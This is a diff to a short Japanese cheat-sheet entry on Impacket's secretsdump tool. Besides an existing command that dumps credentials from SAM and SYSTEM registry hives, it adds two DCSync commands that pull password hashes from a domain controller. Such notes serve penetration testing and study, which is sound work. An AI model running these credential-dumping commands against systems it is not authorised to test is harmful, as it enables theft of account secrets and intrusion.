@@ -5,4 +5,6 @@ Impacketに含まれる。
 ## コマンド
 ```bash
 impacket-secretsdump.py -sam <SAM> -system <SYSTEM> local # SAMとSYSTEMレジストリから認証情報をダンプ
+impacket-secretsdump.py <ドメイン>/<ユーザー>@<ターゲット> # DCSync
+impacket-secretsdump.py -just-dc <ドメイン>/<ユーザー>@<ターゲット> # DCSync
 ``` 
